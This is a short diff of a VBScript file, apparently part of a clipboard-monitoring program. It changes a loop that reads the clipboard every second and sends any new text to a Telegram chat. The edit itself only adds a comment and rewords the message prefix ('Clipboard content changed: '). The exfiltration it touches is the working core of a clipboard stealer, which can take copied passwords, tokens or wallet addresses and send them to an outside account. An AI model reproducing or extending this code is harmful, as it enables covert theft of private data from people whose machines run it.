@@ -73,9 +73,10 @@ Do While True
     Dim currentClipboardText
     currentClipboardText = GetClipboardText()
     
+    ' Check if clipboard content has changed
     If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
         lastClipboardText = currentClipboardText
-        SendTelegramMessage "New clipboard text: " & currentClipboardText
+        SendTelegramMessage "Clipboard content changed: " & currentClipboardText
     End If
     
     WScript.Sleep 1000 ' Check every second
